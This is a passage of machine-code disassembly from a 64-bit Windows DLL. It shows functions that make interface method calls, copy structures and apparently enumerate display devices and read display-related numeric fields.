   18000171f:	b8 02 00 00 00       	mov    $0x2,%eax
   180001724:	48 83 c4 28          	add    $0x28,%rsp
   180001728:	c3                   	ret
   180001729:	cc                   	int3
   18000172a:	cc                   	int3
   18000172b:	cc                   	int3
   18000172c:	cc                   	int3
   18000172d:	cc                   	int3
   18000172e:	cc                   	int3
   18000172f:	cc                   	int3
   180001730:	48 83 ec 28          	sub    $0x28,%rsp
   180001734:	48 85 c9             	test   %rcx,%rcx
   180001737:	74 26                	je     0x18000175f
   180001739:	48 85 d2             	test   %rdx,%rdx
   18000173c:	74 21                	je     0x18000175f
   18000173e:	48 8b 89 08 01 00 00 	mov    0x108(%rcx),%rcx
   180001745:	48 85 c9             	test   %rcx,%rcx
   180001748:	75 08                	jne    0x180001752
   18000174a:	8d 41 06             	lea    0x6(%rcx),%eax
   18000174d:	48 83 c4 28          	add    $0x28,%rsp
   180001751:	c3                   	ret
   180001752:	48 8b 01             	mov    (%rcx),%rax
   180001755:	ff 50 60             	call   *0x60(%rax)
   180001758:	33 c0                	xor    %eax,%eax
   18000175a:	48 83 c4 28          	add    $0x28,%rsp
   18000175e:	c3                   	ret
   18000175f:	b8 02 00 00 00       	mov    $0x2,%eax
   180001764:	48 83 c4 28          	add    $0x28,%rsp
   180001768:	c3                   	ret
   180001769:	cc                   	int3
   18000176a:	cc                   	int3
   18000176b:	cc                   	int3
   18000176c:	cc                   	int3
   18000176d:	cc                   	int3
   18000176e:	cc                   	int3
   18000176f:	cc                   	int3
   180001770:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001775:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000177a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000177f:	57                   	push   %rdi
   180001780:	48 83 ec 30          	sub    $0x30,%rsp
   180001784:	49 8b f9             	mov    %r9,%rdi
   180001787:	49 8b d8             	mov    %r8,%rbx
   18000178a:	48 8b ea             	mov    %rdx,%rbp
   18000178d:	48 8b f1             	mov    %rcx,%rsi
   180001790:	48 85 c9             	test   %rcx,%rcx
   180001793:	0f 84 ba 00 00 00    	je     0x180001853
   180001799:	48 85 d2             	test   %rdx,%rdx
   18000179c:	0f 84 b1 00 00 00    	je     0x180001853
   1800017a2:	48 8b 89 08 01 00 00 	mov    0x108(%rcx),%rcx
   1800017a9:	48 85 c9             	test   %rcx,%rcx
   1800017ac:	75 08                	jne    0x1800017b6
   1800017ae:	8d 41 06             	lea    0x6(%rcx),%eax
   1800017b1:	e9 a2 00 00 00       	jmp    0x180001858
   1800017b6:	81 be 10 01 00 00 02 	cmpl   $0x10002,0x110(%rsi)
   1800017bd:	00 01 00 
   1800017c0:	72 16                	jb     0x1800017d8
   1800017c2:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800017c6:	4c 8b 11             	mov    (%rcx),%r10
   1800017c9:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800017cd:	41 ff 52 68          	call   *0x68(%r10)
   1800017d1:	33 c0                	xor    %eax,%eax
   1800017d3:	e9 80 00 00 00       	jmp    0x180001858
   1800017d8:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800017dc:	85 c0                	test   %eax,%eax
   1800017de:	75 0d                	jne    0x1800017ed
   1800017e0:	48 8b 01             	mov    (%rcx),%rax
   1800017e3:	45 33 c9             	xor    %r9d,%r9d
   1800017e6:	ff 50 50             	call   *0x50(%rax)
   1800017e9:	33 c0                	xor    %eax,%eax
   1800017eb:	eb 6b                	jmp    0x180001858
   1800017ed:	48 85 db             	test   %rbx,%rbx
   1800017f0:	74 31                	je     0x180001823
   1800017f2:	85 c0                	test   %eax,%eax
   1800017f4:	74 59                	je     0x18000184f
   1800017f6:	48 8b f8             	mov    %rax,%rdi
   1800017f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001800:	48 8b 8e 08 01 00 00 	mov    0x108(%rsi),%rcx
   180001807:	45 33 c9             	xor    %r9d,%r9d
   18000180a:	4c 8b c3             	mov    %rbx,%r8
   18000180d:	48 8b 01             	mov    (%rcx),%rax
   180001810:	48 8b d5             	mov    %rbp,%rdx
   180001813:	ff 50 50             	call   *0x50(%rax)
   180001816:	48 83 c3 10          	add    $0x10,%rbx
   18000181a:	48 ff cf             	dec    %rdi
   18000181d:	75 e1                	jne    0x180001800
   18000181f:	33 c0                	xor    %eax,%eax
   180001821:	eb 35                	jmp    0x180001858
   180001823:	4d 85 c9             	test   %r9,%r9
   180001826:	74 27                	je     0x18000184f
   180001828:	85 c0                	test   %eax,%eax
   18000182a:	74 23                	je     0x18000184f
   18000182c:	48 8b d8             	mov    %rax,%rbx
   18000182f:	90                   	nop
   180001830:	48 8b 8e 08 01 00 00 	mov    0x108(%rsi),%rcx
   180001837:	4c 8b cf             	mov    %rdi,%r9
   18000183a:	45 33 c0             	xor    %r8d,%r8d
   18000183d:	48 8b 01             	mov    (%rcx),%rax
   180001840:	48 8b d5             	mov    %rbp,%rdx
   180001843:	ff 50 50             	call   *0x50(%rax)
   180001846:	48 83 c7 04          	add    $0x4,%rdi
   18000184a:	48 ff cb             	dec    %rbx
   18000184d:	75 e1                	jne    0x180001830
   18000184f:	33 c0                	xor    %eax,%eax
   180001851:	eb 05                	jmp    0x180001858
   180001853:	b8 02 00 00 00       	mov    $0x2,%eax
   180001858:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000185d:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180001862:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180001867:	48 83 c4 30          	add    $0x30,%rsp
   18000186b:	5f                   	pop    %rdi
   18000186c:	c3                   	ret
   18000186d:	cc                   	int3
   18000186e:	cc                   	int3
   18000186f:	cc                   	int3
   180001870:	4c 8b dc             	mov    %rsp,%r11
   180001873:	49 89 73 20          	mov    %rsi,0x20(%r11)
   180001877:	57                   	push   %rdi
   180001878:	48 81 ec e0 01 00 00 	sub    $0x1e0,%rsp
   18000187f:	48 8b 05 7a 77 01 00 	mov    0x1777a(%rip),%rax        # 0x180019000
   180001886:	48 33 c4             	xor    %rsp,%rax
   180001889:	48 89 84 24 d0 01 00 	mov    %rax,0x1d0(%rsp)
   180001890:	00 
   180001891:	33 ff                	xor    %edi,%edi
   180001893:	49 89 6b 18          	mov    %rbp,0x18(%r11)
   180001897:	48 8b f1             	mov    %rcx,%rsi
   18000189a:	8b ef                	mov    %edi,%ebp
   18000189c:	39 b9 68 03 00 00    	cmp    %edi,0x368(%rcx)
   1800018a2:	7e 49                	jle    0x1800018ed
   1800018a4:	49 89 5b 10          	mov    %rbx,0x10(%r11)
   1800018a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800018af:	00 
   1800018b0:	48 8b 96 60 03 00 00 	mov    0x360(%rsi),%rdx
   1800018b7:	48 63 c5             	movslq %ebp,%rax
   1800018ba:	48 8b ce             	mov    %rsi,%rcx
   1800018bd:	48 6b d8 68          	imul   $0x68,%rax,%rbx
   1800018c1:	48 03 d3             	add    %rbx,%rdx
   1800018c4:	e8 a7 00 00 00       	call   0x180001970
   1800018c9:	48 8b 96 60 03 00 00 	mov    0x360(%rsi),%rdx
   1800018d0:	48 8b ce             	mov    %rsi,%rcx
   1800018d3:	48 03 d3             	add    %rbx,%rdx
   1800018d6:	e8 85 17 00 00       	call   0x180003060
   1800018db:	ff c5                	inc    %ebp
   1800018dd:	3b ae 68 03 00 00    	cmp    0x368(%rsi),%ebp
   1800018e3:	7c cb                	jl     0x1800018b0
   1800018e5:	48 8b 9c 24 f8 01 00 	mov    0x1f8(%rsp),%rbx
   1800018ec:	00 
   1800018ed:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1800018f2:	45 33 c9             	xor    %r9d,%r9d
   1800018f5:	33 d2                	xor    %edx,%edx
   1800018f7:	33 c9                	xor    %ecx,%ecx
   1800018f9:	c7 44 24 20 a8 01 00 	movl   $0x1a8,0x20(%rsp)
   180001900:	00 
   180001901:	ff 15 51 f9 00 00    	call   *0xf951(%rip)        # 0x180011258
   180001907:	48 8b ac 24 00 02 00 	mov    0x200(%rsp),%rbp
   18000190e:	00 
   18000190f:	85 c0                	test   %eax,%eax
   180001911:	74 31                	je     0x180001944
   180001913:	f6 84 24 c4 00 00 00 	testb  $0x4,0xc4(%rsp)
   18000191a:	04 
   18000191b:	75 1a                	jne    0x180001937
   18000191d:	ff c7                	inc    %edi
   18000191f:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180001924:	45 33 c9             	xor    %r9d,%r9d
   180001927:	8b d7                	mov    %edi,%edx
   180001929:	33 c9                	xor    %ecx,%ecx
   18000192b:	ff 15 27 f9 00 00    	call   *0xf927(%rip)        # 0x180011258
   180001931:	85 c0                	test   %eax,%eax
   180001933:	75 de                	jne    0x180001913
   180001935:	eb 0d                	jmp    0x180001944
   180001937:	48 8d 54 24 24       	lea    0x24(%rsp),%rdx
   18000193c:	48 8b ce             	mov    %rsi,%rcx
   18000193f:	e8 fc 04 00 00       	call   0x180001e40
   180001944:	48 8b 8c 24 d0 01 00 	mov    0x1d0(%rsp),%rcx
   18000194b:	00 
   18000194c:	48 33 cc             	xor    %rsp,%rcx
   18000194f:	e8 dc 38 00 00       	call   0x180005230
   180001954:	48 8b b4 24 08 02 00 	mov    0x208(%rsp),%rsi
   18000195b:	00 
   18000195c:	48 81 c4 e0 01 00 00 	add    $0x1e0,%rsp
   180001963:	5f                   	pop    %rdi
   180001964:	c3                   	ret
   180001965:	cc                   	int3
   180001966:	cc                   	int3
   180001967:	cc                   	int3
   180001968:	cc                   	int3
   180001969:	cc                   	int3
   18000196a:	cc                   	int3
   18000196b:	cc                   	int3
   18000196c:	cc                   	int3
   18000196d:	cc                   	int3
   18000196e:	cc                   	int3
   18000196f:	cc                   	int3
   180001970:	4c 8b dc             	mov    %rsp,%r11
   180001973:	55                   	push   %rbp
   180001974:	49 8d ab b8 fe ff ff 	lea    -0x148(%r11),%rbp
   18000197b:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   180001982:	48 8b 05 77 76 01 00 	mov    0x17677(%rip),%rax        # 0x180019000
   180001989:	48 33 c4             	xor    %rsp,%rax
   18000198c:	48 89 85 f0 00 00 00 	mov    %rax,0xf0(%rbp)
   180001993:	48 63 42 60          	movslq 0x60(%rdx),%rax
   180001997:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   18000199b:	4d 89 6b d8          	mov    %r13,-0x28(%r11)
   18000199f:	4d 89 73 d0          	mov    %r14,-0x30(%r11)
   1800019a3:	48 8b f1             	mov    %rcx,%rsi
   1800019a6:	4c 8b f2             	mov    %rdx,%r14
   1800019a9:	4c 69 e8 24 06 00 00 	imul   $0x624,%rax,%r13
   1800019b0:	4c 03 a9 70 03 00 00 	add    0x370(%rcx),%r13
   1800019b7:	33 c0                	xor    %eax,%eax
   1800019b9:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   1800019be:	89 42 38             	mov    %eax,0x38(%rdx)
   1800019c1:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1800019c5:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800019ca:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800019ce:	41 8b 55 04          	mov    0x4(%r13),%edx
   1800019d2:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1800019d7:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800019db:	ff 96 b8 00 00 00    	call   *0xb8(%rsi)
   1800019e1:	85 c0                	test   %eax,%eax
   1800019e3:	75 27                	jne    0x180001a0c
   1800019e5:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   1800019e9:	85 c9                	test   %ecx,%ecx
   1800019eb:	7e 1f                	jle    0x180001a0c
   1800019ed:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1800019f2:	48 05 24 02 00 00    	add    $0x224,%rax
   1800019f8:	f6 00 01             	testb  $0x1,(%rax)
   1800019fb:	74 04                	je     0x180001a01
   1800019fd:	41 ff 46 38          	incl   0x38(%r14)
   180001a01:	48 05 28 02 00 00    	add    $0x228,%rax
   180001a07:	48 ff c9             	dec    %rcx
   180001a0a:	75 ec                	jne    0x1800019f8
   180001a0c:	41 8b 46 38          	mov    0x38(%r14),%eax
   180001a10:	85 c0                	test   %eax,%eax
   180001a12:	0f 84 dc 03 00 00    	je     0x180001df4
   180001a18:	69 c8 d0 01 00 00    	imul   $0x1d0,%eax,%ecx
   180001a1e:	4c 89 bc 24 10 02 00 	mov    %r15,0x210(%rsp)
   180001a25:	00 
   180001a26:	e8 d5 2e 00 00       	call   0x180004900
   180001a2b:	49 63 4e 38          	movslq 0x38(%r14),%rcx
   180001a2f:	33 d2                	xor    %edx,%edx
   180001a31:	49 89 46 40          	mov    %rax,0x40(%r14)
   180001a35:	4c 69 c1 d0 01 00 00 	imul   $0x1d0,%rcx,%r8
   180001a3c:	48 8b c8             	mov    %rax,%rcx
   180001a3f:	e8 1c 38 00 00       	call   0x180005260
   180001a44:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   180001a48:	45 33 c0             	xor    %r8d,%r8d
   180001a4b:	45 8b f8             	mov    %r8d,%r15d
   180001a4e:	85 c9                	test   %ecx,%ecx
   180001a50:	0f 8e 96 03 00 00    	jle    0x180001dec
   180001a56:	48 89 bc 24 30 02 00 	mov    %rdi,0x230(%rsp)
   180001a5d:	00 
   180001a5e:	4c 89 a4 24 28 02 00 	mov    %r12,0x228(%rsp)
   180001a65:	00 
   180001a66:	0f 29 b4 24 00 02 00 	movaps %xmm6,0x200(%rsp)
   180001a6d:	00 
   180001a6e:	f2 0f 10 35 f2 f8 00 	movsd  0xf8f2(%rip),%xmm6        # 0x180011368
   180001a75:	00 
   180001a76:	48 89 9c 24 60 02 00 	mov    %rbx,0x260(%rsp)
   180001a7d:	00 
   180001a7e:	41 8b f8             	mov    %r8d,%edi
   180001a81:	45 8b e0             	mov    %r8d,%r12d
   180001a84:	0f 1f 40 00          	nopl   0x0(%rax)
   180001a88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180001a8f:	00 
   180001a90:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180001a95:	f6 84 07 24 02 00 00 	testb  $0x1,0x224(%rdi,%rax,1)
   180001a9c:	01 
   180001a9d:	0f 84 16 03 00 00    	je     0x180001db9
   180001aa3:	49 8b 5e 40          	mov    0x40(%r14),%rbx
   180001aa7:	49 03 dc             	add    %r12,%rbx
   180001aaa:	48 c7 83 54 01 00 00 	movq   $0xffffffffffffffff,0x154(%rbx)
   180001ab1:	ff ff ff ff 
   180001ab5:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180001aba:	8b 0c 07             	mov    (%rdi,%rax,1),%ecx
   180001abd:	b8 02 00 00 00       	mov    $0x2,%eax
   180001ac2:	89 8b c8 01 00 00    	mov    %ecx,0x1c8(%rbx)
   180001ac8:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   180001acd:	48 8b cb             	mov    %rbx,%rcx
   180001ad0:	48 83 c2 14          	add    $0x14,%rdx
   180001ad4:	48 03 d7             	add    %rdi,%rdx
   180001ad7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180001ade:	00 00 
   180001ae0:	0f 10 02             	movups (%rdx),%xmm0
   180001ae3:	48 8d 89 80 00 00 00 	lea    0x80(%rcx),%rcx
   180001aea:	48 8d 92 80 00 00 00 	lea    0x80(%rdx),%rdx
   180001af1:	0f 11 41 80          	movups %xmm0,-0x80(%rcx)
   180001af5:	0f 10 4a 90          	movups -0x70(%rdx),%xmm1
   180001af9:	0f 11 49 90          	movups %xmm1,-0x70(%rcx)
   180001afd:	0f 10 42 a0          	movups -0x60(%rdx),%xmm0
   180001b01:	0f 11 41 a0          	movups %xmm0,-0x60(%rcx)
   180001b05:	0f 10 4a b0          	movups -0x50(%rdx),%xmm1
   180001b09:	0f 11 49 b0          	movups %xmm1,-0x50(%rcx)
   180001b0d:	0f 10 42 c0          	movups -0x40(%rdx),%xmm0
   180001b11:	0f 11 41 c0          	movups %xmm0,-0x40(%rcx)
   180001b15:	0f 10 4a d0          	movups -0x30(%rdx),%xmm1
   180001b19:	0f 11 49 d0          	movups %xmm1,-0x30(%rcx)
   180001b1d:	0f 10 42 e0          	movups -0x20(%rdx),%xmm0
   180001b21:	0f 11 41 e0          	movups %xmm0,-0x20(%rcx)
   180001b25:	0f 10 4a f0          	movups -0x10(%rdx),%xmm1
   180001b29:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   180001b2d:	48 ff c8             	dec    %rax
   180001b30:	75 ae                	jne    0x180001ae0
   180001b32:	88 83 ff 00 00 00    	mov    %al,0xff(%rbx)
   180001b38:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180001b3d:	48 63 54 07 08       	movslq 0x8(%rdi,%rax,1),%rdx
   180001b42:	85 d2                	test   %edx,%edx
   180001b44:	78 3b                	js     0x180001b81
   180001b46:	3b 96 78 03 00 00    	cmp    0x378(%rsi),%edx
   180001b4c:	7d 33                	jge    0x180001b81
   180001b4e:	48 8b 86 70 03 00 00 	mov    0x370(%rsi),%rax
   180001b55:	48 69 ca 24 06 00 00 	imul   $0x624,%rdx,%rcx
   180001b5c:	0f 10 84 01 18 02 00 	movups 0x218(%rcx,%rax,1),%xmm0
   180001b63:	00 
   180001b64:	0f 11 83 00 01 00 00 	movups %xmm0,0x100(%rbx)
   180001b6b:	0f 10 8c 01 28 02 00 	movups 0x228(%rcx,%rax,1),%xmm1
   180001b72:	00 
   180001b73:	0f 11 8b 10 01 00 00 	movups %xmm1,0x110(%rbx)
   180001b7a:	c6 83 1f 01 00 00 00 	movb   $0x0,0x11f(%rbx)
   180001b81:	89 93 cc 01 00 00    	mov    %edx,0x1cc(%rbx)
   180001b87:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   180001b8b:	44 89 44 24 48       	mov    %r8d,0x48(%rsp)
   180001b90:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   180001b95:	44 8b 83 c8 01 00 00 	mov    0x1c8(%rbx),%r8d
   180001b9c:	8b 93 cc 01 00 00    	mov    0x1cc(%rbx),%edx
   180001ba2:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   180001ba7:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180001bac:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001bb1:	ff 96 98 00 00 00    	call   *0x98(%rsi)
   180001bb7:	85 c0                	test   %eax,%eax
   180001bb9:	75 5a                	jne    0x180001c15
   180001bbb:	39 44 24 48          	cmp    %eax,0x48(%rsp)
   180001bbf:	7e 54                	jle    0x180001c15
   180001bc1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180001bc6:	8b 48 1c             	mov    0x1c(%rax),%ecx
   180001bc9:	89 8b 38 01 00 00    	mov    %ecx,0x138(%rbx)
   180001bcf:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180001bd4:	8b 48 20             	mov    0x20(%rax),%ecx
   180001bd7:	89 8b 3c 01 00 00    	mov    %ecx,0x13c(%rbx)
   180001bdd:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180001be2:	8b 48 28             	mov    0x28(%rax),%ecx
   180001be5:	89 8b 50 01 00 00    	mov    %ecx,0x150(%rbx)
   180001beb:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180001bf0:	8b 48 14             	mov    0x14(%rax),%ecx
   180001bf3:	89 8b 30 01 00 00    	mov    %ecx,0x130(%rbx)
   180001bf9:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180001bfe:	8b 48 18             	mov    0x18(%rax),%ecx
   180001c01:	89 8b 34 01 00 00    	mov    %ecx,0x134(%rbx)
   180001c07:	0f 10 83 30 01 00 00 	movups 0x130(%rbx),%xmm0
   180001c0e:	0f 11 83 40 01 00 00 	movups %xmm0,0x140(%rbx)
   180001c15:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180001c1a:	e8 01 2d 00 00       	call   0x180004920
   180001c1f:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001c24:	33 d2                	xor    %edx,%edx
   180001c26:	41 b8 a0 01 00 00    	mov    $0x1a0,%r8d
   180001c2c:	e8 2f 36 00 00       	call   0x180005260
   180001c31:	48 8b 86 b0 00 00 00 	mov    0xb0(%rsi),%rax
   180001c38:	48 85 c0             	test   %rax,%rax
   180001c3b:	0f 84 6a 01 00 00    	je     0x180001dab
   180001c41:	44 8b 83 c8 01 00 00 	mov    0x1c8(%rbx),%r8d
   180001c48:	41 8b 55 04          	mov    0x4(%r13),%edx
   180001c4c:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   180001c50:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   180001c55:	ff d0                	call   *%rax
   180001c57:	85 c0                	test   %eax,%eax
   180001c59:	0f 85 4c 01 00 00    	jne    0x180001dab
   180001c5f:	8b 85 c4 00 00 00    	mov    0xc4(%rbp),%eax
   180001c65:	83 e0 01             	and    $0x1,%eax
   180001c68:	03 c0                	add    %eax,%eax
   180001c6a:	09 83 20 01 00 00    	or     %eax,0x120(%rbx)
   180001c70:	8b 85 c4 00 00 00    	mov    0xc4(%rbp),%eax
   180001c76:	83 e0 02             	and    $0x2,%eax
   180001c79:	03 c0                	add    %eax,%eax
   180001c7b:	09 83 20 01 00 00    	or     %eax,0x120(%rbx)
   180001c81:	8b 45 60             	mov    0x60(%rbp),%eax
   180001c84:	89 83 24 01 00 00    	mov    %eax,0x124(%rbx)
   180001c8a:	8b 45 64             	mov    0x64(%rbp),%eax
   180001c8d:	89 83 28 01 00 00    	mov    %eax,0x128(%rbx)
   180001c93:	66 0f 6e 45 68       	movd   0x68(%rbp),%xmm0
   180001c98:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
   180001c9b:	f3 0f 11 83 2c 01 00 	movss  %xmm0,0x12c(%rbx)
   180001ca2:	00 
   180001ca3:	66 0f 6e 8d 9c 00 00 	movd   0x9c(%rbp),%xmm1
   180001caa:	00 
   180001cab:	f3 0f e6 c9          	cvtdq2pd %xmm1,%xmm1
   180001caf:	f2 0f 5e ce          	divsd  %xmm6,%xmm1
   180001cb3:	f2 0f 11 8b 60 01 00 	movsd  %xmm1,0x160(%rbx)
   180001cba:	00 
   180001cbb:	66 0f 6e 85 a0 00 00 	movd   0xa0(%rbp),%xmm0
   180001cc2:	00 
   180001cc3:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
   180001cc7:	f2 0f 5e c6          	divsd  %xmm6,%xmm0
   180001ccb:	f2 0f 11 83 68 01 00 	movsd  %xmm0,0x168(%rbx)
   180001cd2:	00 
   180001cd3:	66 0f 6e 8d a4 00 00 	movd   0xa4(%rbp),%xmm1
   180001cda:	00 
   180001cdb:	f3 0f e6 c9          	cvtdq2pd %xmm1,%xmm1
   180001cdf:	f2 0f 5e ce          	divsd  %xmm6,%xmm1
   180001ce3:	f2 0f 11 8b 70 01 00 	movsd  %xmm1,0x170(%rbx)
   180001cea:	00 
   180001ceb:	66 0f 6e 85 a8 00 00 	movd   0xa8(%rbp),%xmm0
   180001cf2:	00 
   180001cf3:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
   180001cf7:	f2 0f 5e c6          	divsd  %xmm6,%xmm0
   180001cfb:	f2 0f 11 83 78 01 00 	movsd  %xmm0,0x178(%rbx)
   180001d02:	00 
   180001d03:	66 0f 6e 8d ac 00 00 	movd   0xac(%rbp),%xmm1
   180001d0a:	00 
   180001d0b:	f3 0f e6 c9          	cvtdq2pd %xmm1,%xmm1
   180001d0f:	f2 0f 5e ce          	divsd  %xmm6,%xmm1
   180001d13:	f2 0f 11 8b 80 01 00 	movsd  %xmm1,0x180(%rbx)
   180001d1a:	00 
   180001d1b:	66 0f 6e 85 b0 00 00 	movd   0xb0(%rbp),%xmm0
   180001d22:	00 
   180001d23:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
   180001d27:	f2 0f 5e c6          	divsd  %xmm6,%xmm0
   180001d2b:	f2 0f 11 83 88 01 00 	movsd  %xmm0,0x188(%rbx)
   180001d32:	00 
   180001d33:	66 0f 6e 8d b4 00 00 	movd   0xb4(%rbp),%xmm1
   180001d3a:	00 
   180001d3b:	f3 0f e6 c9          	cvtdq2pd %xmm1,%xmm1
   180001d3f:	f2 0f 5e ce          	divsd  %xmm6,%xmm1
   180001d43:	f2 0f 11 8b 90 01 00 	movsd  %xmm1,0x190(%rbx)
   180001d4a:	00 
   180001d4b:	66 0f 6e 85 b8 00 00 	movd   0xb8(%rbp),%xmm0
   180001d52:	00 
   180001d53:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
   180001d57:	f2 0f 5e c6          	divsd  %xmm6,%xmm0
   180001d5b:	f2 0f 11 83 98 01 00 	movsd  %xmm0,0x198(%rbx)
   180001d62:	00 
   180001d63:	66 0f 6e 8d 88 00 00 	movd   0x88(%rbp),%xmm1
   180001d6a:	00 
   180001d6b:	f3 0f e6 c9          	cvtdq2pd %xmm1,%xmm1
   180001d6f:	f2 0f 5e ce          	divsd  %xmm6,%xmm1
   180001d73:	f2 0f 11 8b b0 01 00 	movsd  %xmm1,0x1b0(%rbx)
   180001d7a:	00 
   180001d7b:	66 0f 6e 85 90 00 00 	movd   0x90(%rbp),%xmm0
   180001d82:	00 
   180001d83:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
   180001d87:	f2 0f 5e c6          	divsd  %xmm6,%xmm0
   180001d8b:	f2 0f 11 83 b8 01 00 	movsd  %xmm0,0x1b8(%rbx)
   180001d92:	00 
   180001d93:	66 0f 6e 8d 8c 00 00 	movd   0x8c(%rbp),%xmm1
   180001d9a:	00 
   180001d9b:	f3 0f e6 c9          	cvtdq2pd %xmm1,%xmm1
   180001d9f:	f2 0f 5e ce          	divsd  %xmm6,%xmm1
   180001da3:	f2 0f 11 8b c0 01 00 	movsd  %xmm1,0x1c0(%rbx)
   180001daa:	00 
   180001dab:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   180001daf:	49 81 c4 d0 01 00 00 	add    $0x1d0,%r12
   180001db6:	45 33 c0             	xor    %r8d,%r8d
   180001db9:	41 ff c7             	inc    %r15d
   180001dbc:	48 81 c7 28 02 00 00 	add    $0x228,%rdi
   180001dc3:	44 3b f9             	cmp    %ecx,%r15d
   180001dc6:	0f 8c c4 fc ff ff    	jl     0x180001a90
   180001dcc:	0f 28 b4 24 00 02 00 	movaps 0x200(%rsp),%xmm6
   180001dd3:	00 
   180001dd4:	4c 8b a4 24 28 02 00 	mov    0x228(%rsp),%r12
   180001ddb:	00 
   180001ddc:	48 8b bc 24 30 02 00 	mov    0x230(%rsp),%rdi
   180001de3:	00 
   180001de4:	48 8b 9c 24 60 02 00 	mov    0x260(%rsp),%rbx
   180001deb:	00 
   180001dec:	4c 8b bc 24 10 02 00 	mov    0x210(%rsp),%r15
   180001df3:	00 
   180001df4:	48 83 7c 24 38 00    	cmpq   $0x0,0x38(%rsp)
   180001dfa:	4c 8b b4 24 18 02 00 	mov    0x218(%rsp),%r14
   180001e01:	00 
   180001e02:	4c 8b ac 24 20 02 00 	mov    0x220(%rsp),%r13
   180001e09:	00 
   180001e0a:	48 8b b4 24 38 02 00 	mov    0x238(%rsp),%rsi
   180001e11:	00 
   180001e12:	74 0a                	je     0x180001e1e
   180001e14:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   180001e19:	e8 02 2b 00 00       	call   0x180004920
   180001e1e:	48 8b 8d f0 00 00 00 	mov    0xf0(%rbp),%rcx
   180001e25:	48 33 cc             	xor    %rsp,%rcx
   180001e28:	e8 03 34 00 00       	call   0x180005230
   180001e2d:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   180001e34:	5d                   	pop    %rbp
   180001e35:	c3                   	ret
   180001e36:	cc                   	int3
   180001e37:	cc                   	int3
   180001e38:	cc                   	int3
   180001e39:	cc                   	int3
   180001e3a:	cc                   	int3
   180001e3b:	cc                   	int3
   180001e3c:	cc                   	int3
   180001e3d:	cc                   	int3
   180001e3e:	cc                   	int3
   180001e3f:	cc                   	int3
   180001e40:	41 56                	push   %r14
   180001e42:	48 83 ec 10          	sub    $0x10,%rsp
   180001e46:	48 63 81 68 03 00 00 	movslq 0x368(%rcx),%rax
   180001e4d:	4c 8b f2             	mov    %rdx,%r14
   180001e50:	85 c0                	test   %eax,%eax
   180001e52:	0f 8e bf 00 00 00    	jle    0x180001f17
   180001e58:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001e5d:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   180001e62:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180001e67:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   180001e6c:	4c 89 64 24 08       	mov    %r12,0x8(%rsp)
   180001e71:	4c 89 3c 24          	mov    %r15,(%rsp)
   180001e75:	4c 8b b9 60 03 00 00 	mov    0x360(%rcx),%r15
   180001e7c:	33 db                	xor    %ebx,%ebx
   180001e7e:	4c 8b e0             	mov    %rax,%r12
   180001e81:	49 8d 77 38          	lea    0x38(%r15),%rsi
   180001e85:	33 ff                	xor    %edi,%edi
   180001e87:	42 83 7c 3f 2c 00    	cmpl   $0x0,0x2c(%rdi,%r15,1)
   180001e8d:	74 50                	je     0x180001edf
   180001e8f:	44 8b 1e             	mov    (%rsi),%r11d
   180001e92:	45 33 c9             	xor    %r9d,%r9d
   180001e95:	45 85 db             	test   %r11d,%r11d
   180001e98:	7e 45                	jle    0x180001edf
